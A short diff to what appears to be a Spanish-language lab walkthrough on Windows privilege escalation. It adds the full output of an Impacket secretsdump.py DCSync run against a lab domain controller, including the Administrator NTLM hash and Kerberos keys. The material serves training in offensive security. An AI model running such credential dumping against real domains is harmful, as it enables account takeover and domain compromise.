@@ -266,6 +266,19 @@ SMB         10.129.43.9     445    WINLPE-DC01      [+] INLANEFREIGHT.LOCAL\serv
 
 ```
 secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator
+
+Impacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright 2020 SecureAuth Corporation
+
+Password:
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:5db9c9ada113804443a8aeb64f500cd3e9670348719ce1436bcc95d1d93dad43
+Administrator:aes128-cts-hmac-sha1-96:94c300d0e47775b407f2496a5cca1a0a
+Administrator:des-cbc-md5:d60dfbbf20548938
+[*] Cleaning up...
+
 ```
 
 **Explicación de la sintaxis**:
